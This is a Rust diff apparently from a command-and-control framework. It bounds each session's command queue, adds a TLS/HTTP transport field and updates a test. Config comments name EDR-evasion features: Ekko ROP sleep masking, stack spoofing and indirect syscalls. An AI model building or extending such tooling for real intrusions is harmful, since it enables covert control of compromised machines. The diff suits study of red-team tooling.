@@ -289,9 +289,8 @@ pub struct C2Config {
     // without any config migration.
 
     /// Sleep masking algorithm to use during beacon sleep windows.
-    /// "ekko"    - Ekko ROP-based timer-masked sleep (Windows only; no-op on Linux).
-    /// "foliage" - Foliage APC-based sleep mask (Windows only; no-op on Linux).
-    /// "none"    - Plain Sleep/usleep; no masking.
+    /// "ekko"         - Ekko ROP-based timer-masked sleep (Windows only; no-op on Linux).
+    /// "spoofed-stack" - Stack spoofing without the Ekko timer mask.
     pub sleep_mask: String,
 
     /// Use indirect syscall stubs (Heaven's Gate / SysWhispers-style) instead
@@ -1520,17 +1519,49 @@ impl C2Config {
 /// No typed-config field covers the wire frame cap - intentionally fixed.
 pub fn max_frame_size() -> usize { crate::config::config().transfer.max_frame_bytes as usize }
 
-/// Soft warning threshold. Frames above this are logged but accepted.
-/// No typed-config field covers the warn threshold - intentionally fixed.
-pub fn frame_warn_size() -> usize { crate::config::config().transfer.frame_warn_bytes as usize }
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum SessionTransport {
+    Tls,
+    Http,
+}
+
+pub type SessionCommandMessage = (String, Option<oneshot::Sender<u64>>);
+pub type SessionCommandSender = mpsc::Sender<SessionCommandMessage>;
+pub type SessionCommandReceiver = mpsc::Receiver<SessionCommandMessage>;
+
+pub fn session_command_channel(capacity: usize) -> (SessionCommandSender, SessionCommandReceiver) {
+    mpsc::channel(capacity.max(1))
+}
+
+/// Commands are operator-critical, so a full bounded queue rejects the new
+/// command and logs it instead of silently evicting another pending command.
+pub fn try_send_session_command(
+    session_id: u32,
+    tx: &SessionCommandSender,
+    command: String,
+    callback: Option<oneshot::Sender<u64>>,
+) -> bool {
+    match tx.try_send((command, callback)) {
+        Ok(()) => true,
+        Err(mpsc::error::TrySendError::Full(_)) => {
+            tracing::warn!(session_id, "Session command channel full; command rejected");
+            false
+        }
+        Err(mpsc::error::TrySendError::Closed(_)) => {
+            tracing::warn!(session_id, "Session command channel closed; command rejected");
+            false
+        }
+    }
+}
 
 pub struct Session {
     pub id: u32,
+    pub transport: SessionTransport,
     pub computer_id: String,
     pub addr: SocketAddr,
     pub hostname: String,
     pub os: String,
-    pub tx: mpsc::UnboundedSender<(String, Option<oneshot::Sender<u64>>)>,
+    pub tx: SessionCommandSender,
     pub signing_key: SigningKey,
     pub parent_id: Option<u32>,
     pub last_seen: Arc<std::sync::atomic::AtomicI64>,
@@ -2103,9 +2134,10 @@ mod tests {
 
     #[test]
     fn test_session_last_seen() {
-        let (tx, _rx) = tokio::sync::mpsc::unbounded_channel();
+        let (tx, _rx) = session_command_channel(2);
         let session = Session {
-            id: 1, computer_id: "test".into(), addr: "127.0.0.1:1234".parse().unwrap(),
+            id: 1, transport: SessionTransport::Tls,
+            computer_id: "test".into(), addr: "127.0.0.1:1234".parse().unwrap(),
             hostname: "test".into(), os: "linux".into(), tx,
             signing_key: ed25519_dalek::SigningKey::from_bytes(&[0u8; 32]),
             parent_id: None,
